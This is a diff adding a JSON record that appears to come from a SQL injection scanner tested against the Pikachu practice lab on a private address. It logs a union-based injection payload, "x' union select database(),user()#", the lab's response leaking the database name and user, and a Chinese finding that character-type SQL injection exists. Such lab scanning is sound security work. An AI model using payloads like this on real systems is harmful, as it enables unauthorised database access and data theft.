@@ -1,0 +1,20 @@
+{
+  "request": {
+    "host": "192.168.207.128",
+    "method": "get",
+    "url": "http://192.168.207.128/vul/sqli/sqli_str.php?name=111&submit=查询",
+    "cookie": "",
+    "requestheader": "",
+    "requestbody": ""
+  },
+  "response": {
+    "statuscode": 200,
+    "statusmessage": "",
+    "responsetime": "",
+    "responseheader": "",
+    "responsebody": "<p class='notice'>your uid:pikachu <br />your email is: root@localhost</p>"
+  },
+  "payload": "x' union select database(),user()#",
+  "type": "[+] 存在字符型sql注入"
+
+}
